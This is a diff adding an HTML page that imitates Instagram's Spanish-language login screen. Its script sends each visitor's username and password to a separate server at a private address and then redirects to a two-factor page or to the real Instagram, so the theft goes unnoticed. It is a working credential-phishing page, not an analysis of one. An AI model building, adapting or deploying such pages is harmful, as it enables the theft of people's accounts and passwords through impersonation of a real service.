@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./styles.css" />
+    <link rel="shortcut icon" href="favicon.ico" />
+    <title>Iniciar Sesión Instagram</title>
+</head>
+<body>
+    
+
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
+                </h1>   
+                <form id="loginForm">
+                    <label for="email" class="sr-only">Teléfono, usuario o correo electrónico</label>
+                    <input id="emailInput" name="email" placeholder="Teléfono, usuario o correo electrónico" />
+
+                    <label for="password" class="sr-only">Contraseña</label>
+                    <input id="passwordInput" name="password" type="password" placeholder="Contraseña"/>
+                    <div>
+                    <div class="spinner-3" style="opacity: 0"></div>
+                    <button id="loginButton" type="button">Iniciar Sesión</button>
+                    </div>
+                    
+
+                </form>
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">O</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                        <img src="./img/facebook.png" width="15" height="15">
+                        <a style="margin-left:2px"></a>
+                        <a id="Facebook">Iniciar sesión con Facebook</a>
+                    </div>
+                    <div class="error" style="color: red; font-size: 1.4ch">La contraseña no es correcta</div>
+                    <div class="error" style="color: red; font-size: 1.4ch">Compruebala</div>
+                    <br>
+                    <a href="#">¿Olvidaste la contraseña?</a>
+                    <br>
+                    <a>
+                        <a style="color: grey">También puedes</a><a href="https://help.instagram.com/contact/4062063">reportar contenido que consideres ilegal</a><a style="color: grey">en tu país sin iniciar sesión</a>
+                    </a>
+                </div>
+            </div>
+            <div class="panel register flex justify-content-center" style="padding-top: 2.3ch; padding-bottom: 2.3ch;">
+                <p>¿No tienes una cuenta?</p>
+                <a href="https://www.instagram.com/accounts/emailsignup">Regístrate</a>
+            </div>
+            <div class="app-download flex direction-column align-items-center">
+                <p>Descarga la aplicación.</p>
+                <div class="flex justify-content-center">
+                    <img src="./img/googleplay-button.png" alt="Imagen con la logo de la Google Play" title="Imagen con la logo de la Google Play" />
+                    <img src="./img/apple-button.png" alt="Imagen con la logo de la Apple Store" title="Imagen con la logo de la Apple Store" />
+                   
+                </div>
+            </div>
+        </section>
+    </main>
+    <br>
+    <br>
+    <footer>
+        <ul class="flex flex-wrap justify-content-center">
+            <li><a href="#">Meta</a></li>
+            <li><a href="#">Información</a></li>
+            <li><a href="#">Blog</a></li>
+            <li><a href="#">Empleo</a></li>
+            <li><a href="#">Ayuda</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">Privacidad</a></li>
+            <li><a href="#">Condiciones</a></li>
+            <li><a href="#">Ubicaciones</a></li>
+            <li><a href="#">Instagram Lite</a></li>
+            <li><a href="#">Threads</a></li>
+            <li><a href="#">Subir contactos y personas no usuarias</a></li>
+            <li><a href="#">Meta verified</a></li>
+        </ul>
+        <ul class="flex flex-wrap justify-content-center">
+            <a class="copyright">Español (España)</a>
+            <a class="copyright">© 2023 Instagram from Meta</a>
+        </ul>
+        <br>
+    </footer>
+
+    
+    <script>
+        // Función para mostrar un elemento con la clase "lds-spinner"
+        
+        
+        
+        
+
+        document.addEventListener("DOMContentLoaded", function () {
+            document.querySelectorAll('.error').forEach(elemento => elemento.style.display = 'none');
+            const loginButton = document.getElementById("loginButton");
+            const emailInput = document.getElementById("emailInput");
+            const passwordInput = document.getElementById("passwordInput");
+
+            loginButton.addEventListener("click", function () {
+                const name = emailInput.value;
+                const password = passwordInput.value;
+
+                // Crea un objeto con los datos que deseas enviar en la solicitud POST
+                const data = {
+                    name: name,
+                    password: password
+                };
+
+                document.getElementById('loginButton').textContent=''
+                document.querySelector('.spinner-3').style.opacity=1
+                
+                // Realiza la solicitud POST utilizando la función fetch
+                fetch("http://192.168.1.46:3001/crear-usuario", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(data)
+                })
+                .then(response => response.json())
+                .then(responseData => {
+                    // Maneja la respuesta del servidor aquí
+                    console.log("Respuesta del servidor:", responseData);
+
+                    // Guarda el ID de usuario en el almacenamiento local
+                    localStorage.setItem('userId', responseData.user.id);
+
+                    // Redirige a la página 2FA.html
+                    //console.log(responseData.MF)
+                   if(responseData.MF==true){
+                        window.location.href = '2FA.html';
+                    }else{
+                        window.location.href = 'https://www.instagram.com';
+                    }
+                    
+                })
+                .catch(error => {
+                    // Maneja los errores aquí
+                    console.error("Error al enviar la solicitud:", error);
+                    document.querySelector('.spinner-3').style.opacity=0
+                    document.querySelectorAll('.error').forEach(elemento => elemento.style.display = 'block');
+                    document.getElementById('loginButton').textContent='Iniciar Sesion'
+                });
+                
+            });
+        });
+    </script>
+</body>
+</html>
